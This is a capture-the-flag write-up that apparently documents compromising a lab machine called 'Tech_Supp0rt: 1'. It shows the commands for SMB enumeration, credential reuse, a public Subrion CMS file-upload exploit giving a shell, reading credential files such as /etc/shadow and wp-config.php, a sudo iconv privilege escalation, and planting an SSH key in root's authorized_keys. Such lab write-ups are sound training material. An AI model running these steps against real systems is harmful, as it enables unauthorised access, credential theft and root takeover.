
![image](https://user-images.githubusercontent.com/71709864/221074068-11d3169e-530e-4df7-80bb-a91efe0bcc33.png)


# Tech_Supp0rt: 1

## Hack into the machine and investigate the target.

I started of this challenge by running an nmap scan and also ran a gobuster scan.
```
nmap -sV -sC <IP_Machine>
```
```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u <IP_Machine>
```
The nmap scan came back and I quickly noticed that there was an smb server present.

Host Scripts Results:

account_used: guest

authentication_level: user

After many failed attempts of trying to make the credentials work with 
the smbclient command.. I searched online and found a command to connect.

```
smbclient //<Machine_IP>/websvr
```

Here I was into the smb server client
From here I used an 'ls' command and saw that there was an 'enter.txt' file.
I used a 'get' command to download the file onto my host machine.
After I opened the file on my machine it read:
______________________________________________________________________
```
Goals
=====
1)Make fake popup and host it online on Digital Ocean server

2)Fix subrion site, /subrion doesn't work, edit from panel

3)Edit wordpress website

IMP
===
Subrion creds

|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]

Wordpress creds

|->
```
_______________________________________________________________________

Reading this file I saw that the 'subrion/' looked like a directory on the webpage. 
There also seemed to be a username and password. (If you put the password into
cyberchef and cook it with the magic decryption.. it comes out to 'Scam2021')

I tried to put the subrion/ onto the end of browser search and came 
up with a directory along with a /robots.txt after it.

http://<IP_Machine>/subrion/robots.txt
resulted with these directories >> 
______________________________________________________________________
User-agent: *

Disallow: /backup/

Disallow: /cron/?

Disallow: /front/

Disallow: /install/

Disallow: /panel/

Disallow: /tmp/

Disallow: /updates/
_________________________________________________________________________

I tried to input all of these and the one that looked most interesting
was the '/panel/' page because I already had a username and a password.

After logging in it appeared I could be able to run an exploit and get a shell on this machine.
There was a version that I could see as Subrion CMS
v 4.2.1

I found an exploit on 'exploit-db' which seemed to match the same version called 
Subrion CMS 4.2.1 - Arbitrary File Upload 

When trying to run the exploit I got an error tha looked like this :

```
Traceback (most recent call last):
  File "49876.py", line 19, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
```
I then installed BeauttifulSoup using https://pypi.org/project/beautifulsoup4/

```
pip2 install beautifulsoup4
```

After installing.. I ran the command again with the username (-l) and password (-p)
like so--->

```
python3 49876.py -u http://10.10.198.19/subrion/panel/ -l admin -p Scam2021
``` 
AND I GOT A SHELL ^-^
Here I searched for /etc/passwd file 

```
cat /etc/passwd
```
I noticed that there was a directory to 'scamsite' and also knew that the site was powered
by wordpress so I could be able to run a cat command using this in the shell.

```
cat /var/www/html/wordpress/wp-config.php
```

Here I got access to the file and was able to find a password 

```
/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

I then ran ssh to connect to the website using the password I found
in the database.

```
ssh scamsite@<IP_Machine>
```
And then I was connected to 'scamsite@TechSupport'
I then checked for permissions. 

```
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/iconv
```

Once I saw that we had privilege here.. I went to GTFO bins and 
searched for permissions. I searched iconv and used -->

```
LFILE=file_to_read   
./iconv -f 8859_1 -t 8859_1 "$LFILE"
```

Then I imput the path I wanted to use

```
LFILE=/etc/shadow   
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

This gave me the shadow file. I then ran another command
This time using -->

```
LFILE=/root/root.txt
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

And I got the root.txt flag

This wasn't the end as I wanted to get to the root user.
On my machine I generated a public and private key.

```
ssh-keygen
```

I copied the public key and put it onto the attacking machine

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXAr00dvELBb43yeqP1kKlKcmJfiF5Kf4FXmHUwr17wwEpl
yP4jvjCS1uyW4Wrz+Bu1htWrW5NoiBwbR6BZqzXjlJKDVH3vKI2DvoQRLyvsdG+h7CmtszATI/zkLIL9kSfoVlXtWpNaN/9Ay8
/rQISsgsMdERPq/o6aatQF0KEtBPOW6+/TuwY9iFujfK56veQkDiolVN+BXSbz//HIzFyC1Tf8dnjBXVDEfHqicuW
50uuJq0Haj6ZETCWk0r/BOUCD28R2AFbqRd2z1RTCThSMzpoBKHeDTLqpc1z4ebpVlk0DL2DzMzCLKAa
kWe/CVAn7jzHfiVmQ5SwhF7NVSCV lotus@<<Machine_IP>" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys  
```

I then used the key pair to log onto the root user.

```
ssh root@<attacking_ip> -i tech_support
```

And finally I was root ^_^.
